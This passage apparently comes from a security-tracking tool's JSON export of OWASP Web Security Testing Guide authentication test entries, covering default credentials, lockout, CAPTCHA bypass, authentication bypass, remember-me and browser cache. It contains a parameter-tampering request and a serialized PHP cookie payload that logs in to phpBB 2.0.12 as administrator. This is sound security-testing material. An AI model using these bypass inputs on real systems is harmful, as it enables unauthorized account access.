Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-01 Testing for Credentials Transported over an Encrypted Channel","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"This content has been merged into: [Testing for Sensitive Information Sent via Unencrypted Channels](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels)","TestingInstructions":null,"Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"This content has been merged into: [Testing for Sensitive Information Sent via Unencrypted Channels](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels)","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-02 Testing for Default Credentials","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nMany web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.\nAdditionally, when new users are created on the applications, these may have predefined passwords set. These could either be generated automatically by the application, or manually created by staff. In both cases, if they are not generated in a secure manner, the passwords may be possible for an attacker to guess.","TestingInstructions":"## Test Objectives\n\n* Determine whether the application has any user accounts with default passwords.\n* Review whether new user accounts are created with weak or predictable passwords.\n\n## How to Test\n\n### Testing for Vendor Default Credentials\n\nThe first step to identifying default passwords is to identify the software that is in use. This is covered in detail in the [Information Gathering](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/README) section of the guide.\nOnce the software has been identified, try to find whether it uses default passwords, and if so, what they are. This should include:\n\n* Searching for \u201C[SOFTWARE] default password\u201D.\n* Reviewing the manual or vendor documentation.\n* Checking common default password databases, such as [CIRT.net](https://cirt.net/passwords), [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) or [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv).\n* Inspecting the application source code (if available).\n* Installing the application on a virtual machine and inspecting it.\n* Inspecting the physical hardware for stickers (often present on network devices).\n\nIf a default password can\u2019t be found, try common options such as:\n\n* \u201Cadmin\u201D, \u201Cpassword\u201D, \u201C12345\u201D, or other [common default passwords](https://github.com/nixawk/fuzzdb/blob/master/bruteforce/passwds/default_devices_users%2Bpasswords.txt).\n* An empty or blank password.\n* The serial number or MAC address of the device.\n\nIf the username is unknown, there are various options for enumerating users, discussed in the [Testing for Account Enumeration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account) guide. Alternatively, try common options such as \u201Cadmin\u201D, \u201Croot\u201D, or \u201Csystem\u201D.\n\n### Testing for Organization Default Passwords\n\nWhen staff within an organization manually create passwords for new accounts, they may do so in a predictable way. This can often be:\n\n* A single common password such as \u201CPassword1\u201D.\n* Organization specific details, such as the organization name or address.\n* Passwords that follow a simple pattern, such as \u201CMonday123\u201D if account is created on a Monday.\n\nThese types of passwords are often difficult to identify from a black-box perspective, unless they can successfully be guessed or brute-forced. However, they are easy to identify when performing grey-box or white-box testing.\n\n### Testing for Application Generated Default Passwords\n\nIf the application automatically generates passwords for new user accounts, these may also be predictable. In order to test these, create multiple accounts on the application with similar details at the same time, and compare the passwords that are given for them.\nThe passwords may be based on:\n\n* A single static string shared between accounts.\n* A hashed or obfuscated part of the account details, such as \u0060md5($username)\u0060.\n* A time-based algorithm.\n* A weak pseudo-random number generator (PRNG).\n\nThis type of issue of often difficult to identify from a black-box perspective.\n\n## Tools\n\n* [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)\n* [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)\n* [Nikto 2](https://www.cirt.net/nikto2)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [CIRT](https://cirt.net/passwords)\n* [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)\n* [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-03 Testing for Weak Lock Out Mechanism","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nAccount lockout mechanisms are used to mitigate brute force attacks. Some of the attacks that can be defeated by using lockout mechanism:\n\n* Login password or username guessing attack.\n* Code guessing on any 2FA functionality or Security Questions.\n\nAccount lockout mechanisms require a balance between protecting accounts from unauthorized access and protecting users from being denied authorized access. Accounts are typically locked after 3 to 5 unsuccessful attempts and can only be unlocked after a predetermined period of time, via a self-service unlock mechanism, or intervention by an administrator.\nDespite it being easy to conduct brute force attacks, the result of a successful attack is dangerous as the attacker will have full access on the user account and with it all the functionality and services they have access to.","TestingInstructions":"## Test Objectives\n\n* Evaluate the account lockout mechanism\u2019s ability to mitigate brute force password guessing.\n* Evaluate the unlock mechanism\u2019s resistance to unauthorized account unlocking.\n\n## How to Test\n\n### Lockout Mechanism\n\nTo test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock. If you have only one account with which you can log on to the web application, perform this test at the end of your test plan to avoid losing testing time by being locked out.\nTo evaluate the account lockout mechanism\u2019s ability to mitigate brute force password guessing, attempt an invalid log in by using the incorrect password a number of times, before using the correct password to verify that the account was locked out. An example test may be as follows:\n\n1. Attempt to log in with an incorrect password 3 times.\n2. Successfully log in with the correct password, thereby showing that the lockout mechanism doesn\u2019t trigger after 3 incorrect authentication attempts.\n3. Attempt to log in with an incorrect password 4 times.\n4. Successfully log in with the correct password, thereby showing that the lockout mechanism doesn\u2019t trigger after 4 incorrect authentication attempts.\n5. Attempt to log in with an incorrect password 5 times.\n6. Attempt to log in with the correct password. The application returns \u201CYour account is locked out.\u201D, thereby confirming that the account is locked out after 5 incorrect authentication attempts.\n7. Attempt to log in with the correct password 5 minutes later. The application returns \u201CYour account is locked out.\u201D, thereby showing that the lockout mechanism does not automatically unlock after 5 minutes.\n8. Attempt to log in with the correct password 10 minutes later. The application returns \u201CYour account is locked out.\u201D, thereby showing that the lockout mechanism does not automatically unlock after 10 minutes.\n9. Successfully log in with the correct password 15 minutes later, thereby showing that the lockout mechanism automatically unlocks after a 10 to 15 minute period.\n\nA CAPTCHA may hinder brute force attacks, but they can come with their own set of weaknesses, and should not replace a lockout mechanism. A CAPTCHA mechanism may be bypassed if implemented incorrectly. CAPTCHA flaws include:\n\n1. Easily defeated challenge, such as arithmetic or limited question set.\n2. CAPTCHA checks for HTTP response code instead of response success.\n3. CAPTCHA server-side logic defaults to a successful solve.\n4. CAPTCHA challenge result is never validated server-side.\n5. CAPTCHA input field or parameter is manually processed, and is improperly validated or escaped.\n\nTo evaluate CAPTCHA effectiveness:\n\n1. Assess CAPTCHA challenges and attempt automating solutions depending on difficulty.\n2. Attempt to submit request without solving CAPTCHA via the normal UI mechanism(s).\n3. Attempt to submit request with intentional CAPTCHA challenge failure.\n4. Attempt to submit request without solving CAPTCHA (assuming some default values may be passed by client-side code, etc) while using a testing proxy (request submitted directly server-side).\n5. Attempt to fuzz CAPTCHA data entry points (if present) with common injection payloads or special characters sequences.\n6. Check if the solution to the CAPTCHA might be the alt-text of the image(s), filename(s), or a value in an associated hidden field.\n7. Attempt to re-submit previously identified known good responses.\n8. Check if clearing cookies causes the CAPTCHA to be bypassed (for example if the CAPTCHA is only shown after a number of failures).\n9. If the CAPTCHA is part of a multi-step process, attempt to simply access or complete a step beyond the CAPTCHA (for example if CAPTCHA is the first step in a login process, try simply submitting the second step [username and password]).\n10. Check for alternative methods that might not have CAPTCHA enforced, such as an API endpoint meant to facilitate mobile app access.\n\nRepeat this process to every possible functionality that could require a lockout mechanism.\n\n### Unlock Mechanism\n\nTo evaluate the unlock mechanism\u2019s resistance to unauthorized account unlocking, initiate the unlock mechanism and look for weaknesses. Typical unlock mechanisms may involve secret questions or an emailed unlock link. The unlock link should be a unique one-time link, to stop an attacker from guessing or replaying the link and performing brute force attacks in batches.\nNote that an unlock mechanism should only be used for unlocking accounts. It is not the same as a password recovery mechanism, yet could follow the same security practices.","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nApply account unlock mechanisms depending on the risk level. In order from lowest to highest assurance:\n\n1. Time-based lockout and unlock.\n2. Self-service unlock (sends unlock email to registered email address).\n3. Manual administrator unlock.\n4. Manual administrator unlock with positive user identification.\n\nFactors to consider when implementing an account lockout mechanism:\n\n1. What is the risk of brute force password guessing against the application?\n2. Is a CAPTCHA sufficient to mitigate this risk?\n3. Is a client-side lockout mechanism being used (e.g., JavaScript)? (If so, disable the client-side code to test.)\n4. Number of unsuccessful log in attempts before lockout. If the lockout threshold is too low then valid users may be locked out too often. If the lockout threshold is too high then the more attempts an attacker can make to brute force the account before it will be locked. Depending on the application\u2019s purpose, a range of 5 to 10 unsuccessful attempts is a typical lockout threshold.\n5. How will accounts be unlocked?\n    1. Manually by an administrator: this is the most secure lockout method, but may cause inconvenience to users and take up the administrator\u2019s \u201Cvaluable\u201D time.\n        1. Note that the administrator should also have a recovery method in case his account gets locked.\n        2. This unlock mechanism may lead to a denial-of-service attack if an attacker\u2019s goal is to lock the accounts of all users of the web application.\n    2. After a period of time: What is the lockout duration? Is this sufficient for the application being protected? E.g. a 5 to 30 minute lockout duration may be a good compromise between mitigating brute force attacks and inconveniencing valid users.\n    3. Via a self-service mechanism: As stated before, this self-service mechanism must be secure enough to avoid that the attacker can unlock accounts himself.\n\n\n\u003Cbr\u003E\n","References":"## References\n\n* See the OWASP article on [Brute Force](https://owasp.org/www-community/attacks/Brute_force_attack) Attacks.\n* [Forgot Password CS](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-04 Testing for Bypassing Authentication Schema","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIn computer security, authentication is the process of attempting to verify the digital identity of the sender of a communication. A common example of such a process is the log on process. Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism.\nWhile most applications require authentication to gain access to private information or to execute tasks, not every authentication method is able to provide adequate security. Negligence, ignorance, or simple understatement of security threats often result in authentication schemes that can be bypassed by simply skipping the log in page and directly calling an internal page that is supposed to be accessed only after authentication has been performed.\nIn addition, it is often possible to bypass authentication measures by tampering with requests and tricking the application into thinking that the user is already authenticated. This can be accomplished either by modifying the given URL parameter, by manipulating the form, or by counterfeiting sessions.\nProblems related to the authentication schema can be found at different stages of the software development lifecycle (SDLC), like the design, development, and deployment phases:\n\n* In the design phase errors can include a wrong definition of application sections to be protected, the choice of not applying strong encryption protocols for securing the transmission of credentials, and many more.\n* In the development phase errors can include the incorrect implementation of input validation functionality or not following the security best practices for the specific language.\n* In the application deployment phase, there may be issues during the application setup (installation and configuration activities) due to a lack in required technical skills or due to the lack of good documentation.","TestingInstructions":"## Test Objectives\n\n* Ensure that authentication is applied across all services that require it.\n\n## How to Test\n\nThere are several methods of bypassing the authentication schema that is used by a web application:\n\n* Direct page request ([forced browsing](https://owasp.org/www-community/attacks/Forced_browsing))\n* Parameter modification\n* Session ID prediction\n* SQL injection\n\n### Direct Page Request\n\nIf a web application implements access control only on the log in page, the authentication schema could be bypassed. For example, if a user directly requests a different page via forced browsing, that page may not check the credentials of the user before granting access. Attempt to directly access a protected page through the address bar in your browser to test using this method.\n![Direct Request to Protected Page](Image Not Found)\n*Figure 4.4.4-1: Direct Request to Protected Page*\n\n### Parameter Modification\n\nAnother problem related to authentication design is when the application verifies a successful log in on the basis of a fixed value parameters. A user could modify these parameters to gain access to the protected areas without providing valid credentials. In the example below, the \u201Cauthenticated\u201D parameter is changed to a value of \u201Cyes\u201D, which allows the user to gain access. In this example, the parameter is in the URL, but a proxy could also be used to modify the parameter, especially when the parameters are sent as form elements in a POST request or when the parameters are stored in a cookie.\n\n\u0060\u0060\u0060\nhttp://www.site.com/page.asp?authenticated=no\n\nraven@blackbox /home $nc www.site.com 80\nGET /page.asp?authenticated=yes HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Sat, 11 Nov 2006 10:22:44 GMT\nServer: Apache\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n\u003C!DOCTYPE HTML PUBLIC \u0022-//IETF//DTD HTML 2.0//EN\u0022\u003E\n\u003CHTML\u003E\u003CHEAD\u003E\n\u003C/HEAD\u003E\u003CBODY\u003E\n\u003CH1\u003EYou Are Authenticated\u003C/H1\u003E\n\u003C/BODY\u003E\u003C/HTML\u003E\n\u0060\u0060\u0060\n\n![Parameter Modified Request](Image Not Found)\n*Figure 4.4.4-2: Parameter Modified Request*\n\n### Session ID Prediction\n\nMany web applications manage authentication by using session identifiers (session IDs). Therefore, if session ID generation is predictable, a malicious user could be able to find a valid session ID and gain unauthorized access to the application, impersonating a previously authenticated user.\nIn the following figure, values inside cookies increase linearly, so it could be easy for an attacker to guess a valid session ID.\n![Cookie Values Over Time](Image Not Found)\n*Figure 4.4.4-3: Cookie Values Over Time*\nIn the following figure, values inside cookies change only partially, so it\u2019s possible to restrict a brute force attack to the defined fields shown below.\n![Partially Changed Cookie Values](Image Not Found)\n*Figure 4.4.4-4: Partially Changed Cookie Values*\n\n### SQL Injection (HTML Form Authentication)\n\nSQL Injection is a widely known attack technique. This section is not going to describe this technique in detail as there are several sections in this guide that explain injection techniques beyond the scope of this section.\n![SQL Injection](Image Not Found)\n*Figure 4.4.4-5: SQL Injection*\nThe following figure shows that with a simple SQL injection attack, it is sometimes possible to bypass the authentication form.\n![Simple SQL Injection Attack](Image Not Found)\n*Figure 4.4.4-6: Simple SQL Injection Attack*\n\n### PHP Loose Comparison\n\nIf an attacker has been able to retrieve the application source code by exploiting a previously discovered vulnerability (e.g., directory traversal), or from a web repository (Open Source Applications), it could be possible to perform refined attacks against the implementation of the authentication process.\nIn the following example (PHPBB 2.0.12 - Authentication Bypass Vulnerability), at line 2 the \u0060unserialize()\u0060 function parses a user supplied cookie and sets values inside the \u0060$sessiondata\u0060 array. At line 7, the user\u2019s MD5 password hash stored inside the backend database (\u0060$auto_login_key\u0060) is compared to the one supplied (\u0060$sessiondata[\u0027autologinid\u0027]\u0060) by the user.\n\n\u0060\u0060\u0060\n1. if (isset($HTTP_COOKIE_VARS[$cookiename . \u0027_sid\u0027])) {\n2.     $sessiondata = isset($HTTP_COOKIE_VARS[$cookiename . \u0027_data\u0027]) ? unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . \u0027_data\u0027])) : array();\n3.     $sessionmethod = SESSION_METHOD_COOKIE;\n4. }\n5. $auto_login_key = $userdata[\u0027user_password\u0027];\n6. // We have to login automagically\n7. if( $sessiondata[\u0027autologinid\u0027] == $auto_login_key )\n8. {\n9.     // autologinid matches password\n10.     $login = 1;\n11.     $enable_autologin = 1;\n12. }\n\u0060\u0060\u0060\n\nIn PHP, a comparison between a string value and a \u0060true\u0060 boolean value is always \u0060true\u0060 (because the string contains a value), so by supplying the following string to the \u0060unserialize()\u0060 function, it is possible to bypass the authentication control and log in as administrator, whose \u0060userid\u0060 is 2:\n\n\u0060\u0060\u0060\na:2:{s:11:\u0022autologinid\u0022;b:1;s:6:\u0022userid\u0022;s:1:\u00222\u0022;}  // original value: a:2:{s:11:\u0022autologinid\u0022;s:32:\u00228b8e9715d12e4ca12c4c3eb4865aaf6a\u0022;s:6:\u0022userid\u0022;s:4:\u00221337\u0022;}\n\u0060\u0060\u0060\n\nLet\u2019s disassemble what we did in this string:\n\n1. \u0060autologinid\u0060 is now a boolean set to \u0060true\u0060: this can be seen by replacing the MD5 value of the password hash (\u0060s:32:\u00228b8e9715d12e4ca12c4c3eb4865aaf6a\u0022\u0060) with \u0060b:1\u0060\n2. \u0060userid\u0060 is now set to the admin id: this can be seen in the last piece of the string, where we replaced our regular user ID (\u0060s:4:\u00221337\u0022\u0060) with \u0060s:1:\u00222\u0022\u0060\n\n## Tools\n\n* [WebGoat](https://owasp.org/www-project-webgoat/)\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [Niels Teusink: phpBB 2.0.12 authentication bypass](http://blog.teusink.net/2008/12/classic-bug-phpbb-2012-authentication.html)\n* [David Endler: \u201CSession ID Brute Force Exploitation and Prediction\u201D](https://www.cgisecurity.com/lib/SessionIDs.pdf)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-05 Testing for Vulnerable Remember Password","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nCredentials are the most widely used authentication technology. Due to such a wide usage of username-password pairs, users are no longer able to properly handle their credentials across the multitude of used applications.\nIn order to assist users with their credentials, multiple technologies surfaced:\n\n* Applications provide a *remember me* functionality that allows the user to stay authenticated for long periods of time, without asking the user again for their credentials.\n* Password Managers - including browser password managers - that allow the user to store their credentials in a secure manner and later on inject them in user-forms without any user intervention.","TestingInstructions":"## Test Objectives\n\n* Validate that the generated session is managed securely and do not put the user\u2019s credentials in danger.\n\n## How to Test\n\nAs these methods provide a better user experience and allow the user to forget all about their credentials, they increase the attack surface area. Some applications:\n\n* Store the credentials in an encoded fashion in the browser\u2019s storage mechanisms, which can be verified by following the [web storage testing scenario](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage) and going through the [session analysis](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema#session-analysis) scenarios. Credentials shouldn\u2019t be stored in any way in the client-side application, and should be substituted by tokens generated server-side.\n* Automatically inject the user\u2019s credentials that can be abused by:\n    * [ClickJacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking) attacks.\n    * [CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery) attacks.\n* Tokens should be analyzed in terms of token-lifetime, where some tokens never expire and put the users in danger if those tokens ever get stolen. Make sure to follow the [session timeout](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout) testing scenario.","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n* Follow [session management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) good practices.\n* Ensure that no credentials are stored in clear text or are easily retrievable in encoded or encrypted forms in browser storage mechanisms; they should be stored server-side and follow good [password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) practices.","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-06 Testing for Browser Cache Weaknesses","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIn this phase the tester checks that the application correctly instructs the browser to not retain sensitive data.\nBrowsers can store information for purposes of caching and history. Caching is used to improve performance, so that previously displayed information doesn\u2019t need to be downloaded again. History mechanisms are used for user convenience, so the user can see exactly what they saw at the time when the resource was retrieved. If sensitive information is displayed to the user (such as their address, credit card details, Social Security Number, or username), then this information could be stored for purposes of caching or history, and therefore retrievable through examining the browser\u2019s cache or by simply pressing the browser\u2019s **Back** button.","TestingInstructions":"## Test Objectives\n\n* Review if the application stores sensitive information on the client-side.\n* Review if access can occur without authorization.\n\n## How to Test\n\n### Browser History\n\nTechnically, the **Back** button is a history and not a cache (see [Caching in HTTP: History Lists](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.13)). The cache and the history are two different entities. However, they share the same weakness of presenting previously displayed sensitive information.\nThe first and simplest test consists of entering sensitive information into the application and logging out. Then the tester clicks the **Back** button of the browser to check whether previously displayed sensitive information can be accessed whilst unauthenticated.\nIf by pressing the **Back** button the tester can access previous pages but not access new ones, then it is not an authentication issue, but a browser history issue. If these pages contain sensitive data, it means that the application did not forbid the browser from storing it.\nAuthentication does not necessarily need to be involved in the testing. For example, when a user enters their email address in order to sign up to a newsletter, this information could be retrievable if not properly handled.\nThe **Back** button can be stopped from showing sensitive data. This can be done by:\n\n* Delivering the page over HTTPS.\n* Setting \u0060Cache-Control: must-revalidate\u0060\n\n### Browser Cache\n\nHere testers check that the application does not leak any sensitive data into the browser cache. In order to do that, they can use a proxy (such as ZAP) and search through the server responses that belong to the session, checking that for every page that contains sensitive information the server instructed the browser not to cache any data. Such a directive can be issued in the HTTP response headers with the following directives:\n\n* \u0060Cache-Control: no-cache, no-store\u0060\n* \u0060Expires: 0\u0060\n* \u0060Pragma: no-cache\u0060\n\nThese directives are generally robust, although additional flags may be necessary for the \u0060Cache-Control\u0060 header in order to better prevent persistently linked files on the file system. These include:\n\n* \u0060Cache-Control: must-revalidate, max-age=0, s-maxage=0\u0060\n\n\u0060\u0060\u0060\nHTTP/1.1:\nCache-Control: no-cache\n\u0060\u0060\u0060\n\n\u0060\u0060\u0060\nHTTP/1.0:\nPragma: no-cache\nExpires: \u0022past date or illegal value (e.g., 0)\u0022\n\u0060\u0060\u0060\n\nFor instance, if testers are testing an e-commerce application, they should look for all pages that contain a credit card number or some other financial information, and check that all those pages enforce the \u0060no-cache\u0060 directive. If they find pages that contain critical information but that fail to instruct the browser not to cache their content, they know that sensitive information will be stored on the disk, and they can double-check this simply by looking for the page in the browser cache.\nThe exact location where that information is stored depends on the client operating system and on the browser that has been used. Here are some examples:\n\n* Mozilla Firefox:\n    * Unix/Linux: \u0060~/.cache/mozilla/firefox/\u0060\n    * Windows: 